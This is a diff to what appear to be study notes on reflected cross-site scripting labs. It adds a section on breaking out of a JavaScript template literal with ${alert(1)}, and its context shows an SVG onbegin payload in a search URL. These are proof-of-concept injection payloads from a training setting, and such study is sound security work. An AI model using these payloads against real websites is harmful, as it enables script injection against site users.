@@ -288,10 +288,19 @@ You Have a Search Funtion and search like asif and intercept the request and san
     exmple.com/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
   
   
+ ## 10. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+ 
+ You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript template string like
+    
+       <script>
+       var message = `0 search results for 'asif'`;
+       document.getElementById('searchMessage').innerText = message;
+       </script>
+    
+  Replace your input with the following payload to execute JavaScript inside the template string:
   
-    
-    
-    
-    
+      ${alert(1)}
+      
+  
  
  
